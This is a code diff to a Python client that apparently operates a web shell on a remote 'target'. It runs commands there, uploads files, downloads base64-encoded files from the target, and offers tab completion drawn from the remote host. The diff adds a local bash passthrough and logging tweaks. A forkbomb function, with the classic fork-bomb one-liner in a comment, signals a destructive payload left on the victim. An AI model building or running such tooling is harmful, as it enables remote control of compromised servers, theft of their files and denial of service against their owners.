@@ -42,6 +42,27 @@ class MyPrompt(Cmd):
             upload(inp[0],inp[0])
         self.update_prompt()
 
+    def do_shell(self, inp):
+        print(os.popen('/bin/bash -c "'+inp+'"').read(), end='')
+
+    def complete_shell(self, text, line, begidx, endidx):
+        line=line.split(" ")
+        if len(line)>2:
+            return os.popen('/bin/bash -c "compgen -f '+text+'"').read().split("\n")
+        else:
+            return os.popen('/bin/bash -c "compgen -c '+text+'"').read().split("\n")
+
+    def complete_upload(self, text, line, begidx, endidx):
+        line=line.split(" ")
+        if len(line)<=2:
+            li = os.popen('/bin/bash -c "compgen -f '+text+'"').read().split("\n")
+            li=list(filter(None,li))
+            return li
+        else:
+            resp = request("?feature=hint",{"filename": text, "cwd": CWD, "type": "file"})
+            resp["files"]=list(filter(None,resp["files"]))
+            return resp["files"]
+
     def default(self, inp):
         shell(inp)
         self.update_prompt()
@@ -73,7 +94,7 @@ class MyPrompt(Cmd):
 
     def do_foo(self,inp):
         print(inp)
- 
+
 
 def request(url, params):
     global target
@@ -96,23 +117,23 @@ def shell(command):
     if "file" in resp:
         download(resp["name"], resp["file"])
     else:
-        #print(resp["stdout"])
         print("\n".join(resp["stdout"]))
         CWD = resp["cwd"]
 
 def download(name,file):
-    log("Download To "+name)
+    log("Download "+name)
     pathlib.Path("download").mkdir(parents=True, exist_ok=True)
     f=open("download/"+name,"wb")
     f.write(base64.b64decode(file))
     f.close()
+    log("Download complete")
 
 def upload(localname,remotename):
     f=open(localname,"rb")
     file=base64.b64encode(f.read())
     f.close()
     resp=request("?feature=upload",{"path":remotename,"file":file,"cwd":CWD})
-    print("\n".join(resp["stdout"]))
+    log("\n".join(resp["stdout"]))
 
 def forkbomb(): #:(){ :|:& };:
     log("leaving forkbomb")
